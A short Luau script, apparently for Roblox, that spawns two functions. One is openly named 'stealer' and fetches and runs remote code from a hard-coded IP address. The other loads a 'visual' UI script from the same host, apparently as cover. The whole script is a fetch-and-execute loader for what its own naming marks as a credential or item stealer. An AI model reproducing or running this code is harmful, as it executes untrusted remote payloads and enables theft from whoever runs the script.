local function stealer()
    ID="eba392bb-99f9-4a20-9f7a-1ec595715eb4";
loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
end
local function loadui()
  loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
end
task.spawn(stealer)
task.spawn(loadui) 
